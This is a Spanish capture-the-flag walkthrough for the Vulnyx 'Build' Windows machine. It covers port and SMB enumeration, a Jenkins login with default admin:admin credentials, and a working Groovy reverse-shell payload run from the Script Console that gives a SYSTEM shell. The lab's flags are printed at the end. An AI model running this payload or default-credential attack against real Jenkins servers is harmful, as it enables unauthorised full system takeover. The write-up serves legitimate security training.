---
icon: flag
---

# Build Vulnyx (Very Easy- Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 03:31 EDT
Nmap scan report for 192.168.5.67
Host is up (0.0060s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Jetty 12.0.19
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Starting Jenkins
|_http-server-header: Jetty(12.0.19)
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:F4:A6:7F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BUILD, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f4:a6:7f (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: 8h59m56s
| smb2-time: 
|   date: 2025-07-28T16:33:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.60 seconds
```

Veremos varias cosas interesantes, entre ellas una pagina en el puerto `80` por defecto del `IIS` y en el puerto `8080` veremos un `jenkins` con autenticacion, pero tambien veremos un `SAMBA` por lo que tendremos bastantes vias en las que podamos enumerar.

Para poder obtener un poco de informacion basica.

```shell
netexec smb <IP>
```

Info:

```
SMB         192.168.5.67    445    BUILD            [*] Windows 10 / Server 2019 Build 19041 x64 (name:BUILD) (domain:BUILD) (signing:False) (SMBv1:False)
```

Veremos que no nos da gran informacion, por lo que vamos a enumerar el `SAMBA` directamente a ver que nos encontramos, pero nos pondra que tendremos el acceso denegado, por lo que vamos a seguir enumerando.

```shell
smbmap --no-banner -H <IP> -u '' -p ''
```

Info:

```
[*] Detected 1 hosts serving SMB                                                   
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                
[*] Closed 1 connections
```

Nos ha detectado un `host` el cual ya sabemos que esta ahi, pero no veremos gran cosa, por lo que vamos a seguir enumerando de otra forma.

Si nos vamos a donde tenemos el `jenkins` y probamos credenciales por defecto a ver si cuela, veremos que si funcionan estas.

```
User: admin
Pass: admin
```

Veremos que estaremos dentro, al ser `Jenkins` podremos probar la parte donde se pueden ejecutar comandos `scripts` a nivel de sistema, a ver si podemos, ya que hemos entrado como `administrador`.

No iremos a `Manage Jenkins` -> `Script Console`, dentro de este veremos un campo de texto en el que pondremos lo siguiente:

```c
Thread.start {
String host="<IP>";
int port=<PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

Antes de enviar esto nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si volvemos a la pagina, le damos a `Run` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.67] 56548
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>whoami
whoami
nt authority\system
```

Vemos que se estaba ejecutando como `administrador` por lo que hemos obtenido una `shell` directamente como `nt authority\system`, con esto habremos terminado la maquina, vamos a leer las `flags` de `usuario` y `root`.

> user.txt

```
17a6390c294493b8fc423154791cdd0b
```

> root.txt

```
927c9a24e72f5d76ffd8bc9c2477d10f
```
